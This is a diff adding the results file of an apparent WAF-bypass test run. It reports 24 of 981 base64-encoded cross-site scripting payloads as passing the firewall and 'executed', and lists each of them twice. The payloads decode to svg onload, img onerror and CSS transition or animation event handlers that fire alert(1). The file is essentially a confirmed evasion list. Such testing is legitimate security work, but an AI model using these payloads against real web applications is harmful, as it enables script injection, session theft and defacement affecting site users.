@@ -1,0 +1,65 @@
+================================================================================
+File: base64.txt - Summary
+================================================================================
+Total Tested: 981
+Bypassed (WAF): 24
+Blocked (WAF): 957
+Bypass Rate: 2.45%
+
+>>> EXECUTED (Confirmed Success): 24
+>>> Execution Rate: 2.45%
+================================================================================
+
+EXECUTED PAYLOADS (Payload will trigger on server):
+--------------------------------------------------------------------------------
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PHAgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246Y29sb3IgMXMiIiBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PC9wPiI=
+PHN2Zz48bGkgb25sb2FkPWFsZXJ0KDEpPjwvbGk+
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PGZpZ3VyZSBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjpjb2xvciAxcyIiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L2ZpZ3VyZT4i
+PHN2Zz48dGJvZHkgb25sb2FkPWFsZXJ0KDEpPjwvdGJvZHk+
+IjxzdHlsZT46dGFyZ2V0IHt0cmFuc2Zvcm06IHJvdGF0ZSgxODBkZWcpO308L3N0eWxlPjxmaWVsZHNldCBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjp0cmFuc2Zvcm0gMnMiIiBvbnRyYW5zaXRpb25ydW49YWxlcnQoMSk+PC9maWVsZHNldD4i
+PHN2Zy9vbmxvYWQ9YWxlcnQoJycpPg==
+PHN2Zz48YSBvbmxvYWQ9YWxlcnQoMSk+PC9hPg==
+IjxzdHlsZT5Aa2V5ZnJhbWVzIHh7fTwvc3R5bGU+PGNhcHRpb24gc3R5bGU9IiJhbmltYXRpb24tbmFtZTp4IiIgb25hbmltYXRpb25zdGFydD0iImFsZXJ0KDEpIiI+PC9jYXB0aW9uPiI=
+PHN2Zz48ZGQgb25sb2FkPWFsZXJ0KDEpPjwvZGQ+
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PGRhdGEgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246Y29sb3IgMXMiIiBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PC9kYXRhPiI=
+PHN2Zz48dmlkZW8gb25sb2FkPWFsZXJ0KDEpPjwvdmlkZW8+
+PHN2Zz48b3B0Z3JvdXAgb25sb2FkPWFsZXJ0KDEpPjwvb3B0Z3JvdXA+
+PGltZyBzcmNzZXQ9MSBvbmVycm9yPWFsZXJ0KDEpPg==
+IjxzdHlsZT5Aa2V5ZnJhbWVzIHNsaWRlaW4ge308L3N0eWxlPjxtZXRlciBzdHlsZT0iImFuaW1hdGlvbi1kdXJhdGlvbjoxczthbmltYXRpb24tbmFtZTpzbGlkZWluO2FuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6MiIiIG9uYW5pbWF0aW9uaXRlcmF0aW9uPSIiYWxlcnQoMSkiIj48L21ldGVyPiI=
+PHN2Zz48aW1hZ2UgaHJlZj0xIG9uZXJyb3I9YWxlcnQoMSk+
+PHN2Zz48ZGlzY2FyZCBvbmJlZ2luPWFsZXJ0KDEpPg==
+PHN2Zz48dGltZSBvbmxvYWQ9YWxlcnQoMSk+PC90aW1lPg==
+IjxzdHlsZT5Aa2V5ZnJhbWVzIHh7fTwvc3R5bGU+PGZyYW1lc2V0IHN0eWxlPSIiYW5pbWF0aW9uLW5hbWU6eCIiIG9uYW5pbWF0aW9uc3RhcnQ9IiJhbGVydCgxKSIiPjwvZnJhbWVzZXQ+Ig==
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PHN1bW1hcnkgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246Y29sb3IgMXMiIiBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PC9zdW1tYXJ5PiI=
+PHN2Zz48YSBvbmxvYWQ9YWxlcnQoMSk+PC9hPg==
+IjxzdHlsZT46dGFyZ2V0IHt0cmFuc2Zvcm06IHJvdGF0ZSgxODBkZWcpO308L3N0eWxlPjx4c3MgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246dHJhbnNmb3JtIDJzIiIgb250cmFuc2l0aW9ucnVuPWFsZXJ0KDEpPjwveHNzPiI=
+PHN2Zz48cGFyYW0gb25sb2FkPWFsZXJ0KDEpPjwvcGFyYW0+
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PG5hdiBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjpjb2xvciAxcyIiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L25hdj4i
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PHByZSBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjpjb2xvciAxcyIiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L3ByZT4i
+
+ALL BYPASSED PAYLOADS:
+--------------------------------------------------------------------------------
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PHAgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246Y29sb3IgMXMiIiBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PC9wPiI=
+PHN2Zz48bGkgb25sb2FkPWFsZXJ0KDEpPjwvbGk+
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PGZpZ3VyZSBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjpjb2xvciAxcyIiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L2ZpZ3VyZT4i
+PHN2Zz48dGJvZHkgb25sb2FkPWFsZXJ0KDEpPjwvdGJvZHk+
+IjxzdHlsZT46dGFyZ2V0IHt0cmFuc2Zvcm06IHJvdGF0ZSgxODBkZWcpO308L3N0eWxlPjxmaWVsZHNldCBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjp0cmFuc2Zvcm0gMnMiIiBvbnRyYW5zaXRpb25ydW49YWxlcnQoMSk+PC9maWVsZHNldD4i
+PHN2Zy9vbmxvYWQ9YWxlcnQoJycpPg==
+PHN2Zz48YSBvbmxvYWQ9YWxlcnQoMSk+PC9hPg==
+IjxzdHlsZT5Aa2V5ZnJhbWVzIHh7fTwvc3R5bGU+PGNhcHRpb24gc3R5bGU9IiJhbmltYXRpb24tbmFtZTp4IiIgb25hbmltYXRpb25zdGFydD0iImFsZXJ0KDEpIiI+PC9jYXB0aW9uPiI=
+PHN2Zz48ZGQgb25sb2FkPWFsZXJ0KDEpPjwvZGQ+
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PGRhdGEgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246Y29sb3IgMXMiIiBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PC9kYXRhPiI=
+PHN2Zz48dmlkZW8gb25sb2FkPWFsZXJ0KDEpPjwvdmlkZW8+
+PHN2Zz48b3B0Z3JvdXAgb25sb2FkPWFsZXJ0KDEpPjwvb3B0Z3JvdXA+
+PGltZyBzcmNzZXQ9MSBvbmVycm9yPWFsZXJ0KDEpPg==
+IjxzdHlsZT5Aa2V5ZnJhbWVzIHNsaWRlaW4ge308L3N0eWxlPjxtZXRlciBzdHlsZT0iImFuaW1hdGlvbi1kdXJhdGlvbjoxczthbmltYXRpb24tbmFtZTpzbGlkZWluO2FuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6MiIiIG9uYW5pbWF0aW9uaXRlcmF0aW9uPSIiYWxlcnQoMSkiIj48L21ldGVyPiI=
+PHN2Zz48aW1hZ2UgaHJlZj0xIG9uZXJyb3I9YWxlcnQoMSk+
+PHN2Zz48ZGlzY2FyZCBvbmJlZ2luPWFsZXJ0KDEpPg==
+PHN2Zz48dGltZSBvbmxvYWQ9YWxlcnQoMSk+PC90aW1lPg==
+IjxzdHlsZT5Aa2V5ZnJhbWVzIHh7fTwvc3R5bGU+PGZyYW1lc2V0IHN0eWxlPSIiYW5pbWF0aW9uLW5hbWU6eCIiIG9uYW5pbWF0aW9uc3RhcnQ9IiJhbGVydCgxKSIiPjwvZnJhbWVzZXQ+Ig==
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PHN1bW1hcnkgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246Y29sb3IgMXMiIiBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PC9zdW1tYXJ5PiI=
+PHN2Zz48YSBvbmxvYWQ9YWxlcnQoMSk+PC9hPg==
+IjxzdHlsZT46dGFyZ2V0IHt0cmFuc2Zvcm06IHJvdGF0ZSgxODBkZWcpO308L3N0eWxlPjx4c3MgaWQ9eCBzdHlsZT0iInRyYW5zaXRpb246dHJhbnNmb3JtIDJzIiIgb250cmFuc2l0aW9ucnVuPWFsZXJ0KDEpPjwveHNzPiI=
+PHN2Zz48cGFyYW0gb25sb2FkPWFsZXJ0KDEpPjwvcGFyYW0+
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PG5hdiBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjpjb2xvciAxcyIiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L25hdj4i
+IjxzdHlsZT46dGFyZ2V0IHtjb2xvcjpyZWQ7fTwvc3R5bGU+PHByZSBpZD14IHN0eWxlPSIidHJhbnNpdGlvbjpjb2xvciAxcyIiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L3ByZT4i
